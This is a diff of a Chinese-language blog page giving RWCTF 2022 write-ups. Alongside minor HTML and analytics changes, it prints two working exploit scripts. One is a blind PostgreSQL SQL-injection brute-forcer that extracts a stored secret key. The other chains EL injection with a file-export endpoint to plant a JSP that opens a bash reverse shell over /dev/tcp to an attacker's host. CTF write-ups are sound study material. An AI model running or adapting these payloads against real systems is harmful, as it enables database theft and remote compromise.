@@ -1,12 +1,30 @@
 <!DOCTYPE html>
-<html lang="en" ="dark">
+<html lang="en">
 
   <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="keywords" content="" />
+  
+  <meta name="keywords" content="Siebene@ Blog">
+  
   <meta name="author" content="Siebene@" />
-  <meta name="description" content="" />
+  <meta name="description" content="Siebene@ Blog" />
+
+  <link rel="apple-touch-icon" href="/images/favicon.png">
+  <link rel="icon" href="/images/favicon.png">
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4Q88Z8JZE6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-4Q88Z8JZE6');
+    </script>
+  
 
 
     <style>
@@ -19,15 +37,13 @@
       id="bones-stylesheet-css"
       href="/css/style.css"
       type="text/css"
-      media="all"
-    />
+      media="all"/>
     <link
       rel="stylesheet"
       id="Roboto-css"
       href="//fonts.googleapis.com/css2?family=Roboto%3Aital%2Cwght%400%2C400%3B0%2C700%3B0%2C900%3B1%2C400%3B1%2C700%3B1%2C900&#038;display=swap"
       type="text/css"
-      media="all"
-    />
+      media="all"/>
 
     <link rel="stylesheet" href="/css/main.css" />
     <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
@@ -38,20 +54,21 @@
     </script>
     <script
       type="text/javascript"
-      src="/js/lazysizes.min.js"></script>
+      src="/js/lazysizes.min.js">
+    </script>
     <script
       type="text/javascript"
-      src="/js/modernizr.custom.min.js"></script>
+      src="/js/modernizr.custom.min.js">
+    </script>
     <script
       type="text/javascript"
-      src="/js/jquery.js"></script>
+      src="/js/jquery.js">
+    </script>
     <script
       type="text/javascript"
-      src="/js/jquery-migrate.min.js"></script>
-
-
+      src="/js/jquery-migrate.min.js">
+    </script>
 <meta name="generator" content="Hexo 6.2.0"></head>
-
 
   <body class="archive post-type-archive post-type-archive-post" itemscope itemtype="http://schema.org/WebPage">
     <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
@@ -61,7 +78,7 @@
   <!-- LaTex Display -->
 
   
-    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+    <script async type="text/javascript" src="/js/mathjax/tex-chtml.js"></script>
   
   <script>
     MathJax = {
@@ -71,17 +88,6 @@
     }
   </script>
 
-
-
-
-
-  <!-- clipboard -->
-
-  
-    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
-  
-  
-<script src="/js/codeCopy.js"></script>
 
 
 
@@ -230,12 +236,12 @@
 <h2 id="Hack-into-Skynet"><a href="#Hack-into-Skynet" class="headerlink" title="Hack into Skynet"></a>Hack into Skynet</h2><p>登录哪里非常明显的逻辑问题，可以任意密码登录,username置空就行</p>
 <p>之后就可以在name参数注入了</p>
 <p>注入还是比较好测的，主要是我测了下%00居然也可以在pgsql当注释符，做比赛的时候才知道。注入就比较简单了，我观察到像是一种正则匹配的规则，但不是纯文本的正则匹配。所以说尝试换一下注入的位置，试了下在offest这里可以绕</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.digits+string.ascii_letters+<span class="string">r&quot;$&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://47.242.21.212:8081/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;SessionId&quot;</span>: <span class="string">&quot;23d96ab50b7215421dd1c101be70d2e1&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081/&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">		<span class="comment"># SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables </span></span><br><span class="line">		<span class="comment"># current_setting(&#x27;is_superuser&#x27;)</span></span><br><span class="line">		<span class="comment"># data=&quot;(SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables)&quot;</span></span><br><span class="line">		data = <span class="string">&quot;(select secret_key from target_credentials where account=&#x27;skynet&#x27;)&quot;</span></span><br><span class="line">		burp0_data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;s&#x27; or 1::BOOLEAN OFFSET 0|(left(<span class="subst">&#123;data&#125;</span>,<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;)::integer\x00&quot;</span>&#125;</span><br><span class="line">		<span class="built_in">print</span>(burp0_data)</span><br><span class="line">		res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;john.connor&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			flag =flag+j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment"># PostgreSQL 13.5 on x86</span></span><br><span class="line"><span class="comment"># skynet eb0f4c3b032e72d6fdf908dfcfe4836c</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.digits+string.ascii_letters+<span class="string">r&quot;$&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://47.242.21.212:8081/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;SessionId&quot;</span>: <span class="string">&quot;23d96ab50b7215421dd1c101be70d2e1&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://47.242.21.212:8081/&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">		<span class="comment"># SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables </span></span><br><span class="line">		<span class="comment"># current_setting(&#x27;is_superuser&#x27;)</span></span><br><span class="line">		<span class="comment"># data=&quot;(SELECT string_agg(table_name,&#x27;&#x27;) FROM information_schema.tables)&quot;</span></span><br><span class="line">		data = <span class="string">&quot;(select secret_key from target_credentials where account=&#x27;skynet&#x27;)&quot;</span></span><br><span class="line">		burp0_data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;s&#x27; or 1::BOOLEAN OFFSET 0|(left(<span class="subst">&#123;data&#125;</span>,<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag+j&#125;</span>&#x27;)::integer\x00&quot;</span>&#125;</span><br><span class="line">		<span class="built_in">print</span>(burp0_data)</span><br><span class="line">		res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;john.connor&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			flag =flag+j</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="comment"># PostgreSQL 13.5 on x86</span></span><br><span class="line"><span class="comment"># skynet eb0f4c3b032e72d6fdf908dfcfe4836c</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="Desperate-Cat"><a href="#Desperate-Cat" class="headerlink" title="Desperate Cat"></a>Desperate Cat</h2><p>完全不会，看了一会等于什么都没做</p>
 <p>赛后看到wp，非常的顶，而且有几种做法</p>
 <p>预期解，这里是官方的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXIES = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]    <span class="comment"># e.g. http://47.243.235.228:39465/</span></span><br><span class="line">    reverse_shell_host = sys.argv[<span class="number">2</span>]</span><br><span class="line">    reverse_shell_port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    el_payload = <span class="string">r&quot;&quot;&quot;$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span></span><br><span class="line"><span class="string">$&#123;sessionScope[param.b]=param.c&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d&#125;&quot;&quot;&quot;</span></span><br><span class="line">    reverse_shell_jsp_payload = <span class="string">r&quot;&quot;&quot;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sh -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + reverse_shell_host + <span class="string">&quot;/&quot;</span> + reverse_shell_port + <span class="string">r&quot;&quot;&quot; 0&gt;&amp;1&quot;&#125;);%&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                      data=&#123;</span><br><span class="line">                          <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jsp&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;content&#x27;</span>: el_payload,</span><br><span class="line">                      &#125;,</span><br><span class="line">                      proxies=PROXIES)</span><br><span class="line">    shell_path = r.text.strip().split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    shell_url = <span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export/<span class="subst">&#123;shell_path&#125;</span>&#x27;</span></span><br><span class="line">    r2 = requests.post(url=shell_url,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;/tmp/session.jsp&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;voidfyoo&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;c&#x27;</span>: reverse_shell_jsp_payload,</span><br><span class="line">                           <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    r3 = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;./WEB-INF/lib/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jar&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># wait a while</span></span><br><span class="line">    r4 = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/tmp/session.jsp&#x27;</span>, proxies=PROXIES)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXIES = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]    <span class="comment"># e.g. http://47.243.235.228:39465/</span></span><br><span class="line">    reverse_shell_host = sys.argv[<span class="number">2</span>]</span><br><span class="line">    reverse_shell_port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    el_payload = <span class="string">r&quot;&quot;&quot;$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span></span><br><span class="line"><span class="string">$&#123;sessionScope[param.b]=param.c&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span></span><br><span class="line"><span class="string">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d&#125;&quot;&quot;&quot;</span></span><br><span class="line">    reverse_shell_jsp_payload = <span class="string">r&quot;&quot;&quot;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sh -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + reverse_shell_host + <span class="string">&quot;/&quot;</span> + reverse_shell_port + <span class="string">r&quot;&quot;&quot; 0&gt;&amp;1&quot;&#125;);%&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                      data=&#123;</span><br><span class="line">                          <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jsp&#x27;</span>,</span><br><span class="line">                          <span class="string">&#x27;content&#x27;</span>: el_payload,</span><br><span class="line">                      &#125;,</span><br><span class="line">                      proxies=PROXIES)</span><br><span class="line">    shell_path = r.text.strip().split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    shell_url = <span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export/<span class="subst">&#123;shell_path&#125;</span>&#x27;</span></span><br><span class="line">    r2 = requests.post(url=shell_url,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;/tmp/session.jsp&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;voidfyoo&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;c&#x27;</span>: reverse_shell_jsp_payload,</span><br><span class="line">                           <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    r3 = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                       data=&#123;</span><br><span class="line">                           <span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;./WEB-INF/lib/&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jar&#x27;</span>,</span><br><span class="line">                           <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">                       &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># wait a while</span></span><br><span class="line">    r4 = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/tmp/session.jsp&#x27;</span>, proxies=PROXIES)</span><br></pre></td></tr></table></figure>
 
 <p>基础还是很重要的，我完全不知道可以用el干这么骚的事情，我看那么多控制字符都没了都绝望好久了。</p>
 <p>简单解释一下<img src="/2022/01/24/RWCTF2022-WriteUps/1.png" alt="1"></p>
@@ -248,7 +254,7 @@
               <div class="share-area lazyload">
                 <ul>
                   <li>
-                    <a href="https://twitter/Siebene7" target="_blank">
+                    <a href="https://twitter.com/Siebene7" target="_blank">
                       <i class="fab fa-twitter"></i>
                     </a>
                   </li>
@@ -285,9 +291,9 @@ itemtype="http://schema.org/WPFooter">
 
   <nav role="navigation">
     <div class="footer-links cf lazyload">
-      <ul id="menu-main_navi-1" class="nav footer-nav cf">
+      <ul id="menu-main_navi" class="nav footer-nav cf">
         <li
-          class="menu-item menu-item-type-custom menu-item-object-custom menu-item-190">
+          class="menu-item menu-item-type-custom menu-item-object-custom">
           <a href="/">Home</a>
         </li>
 
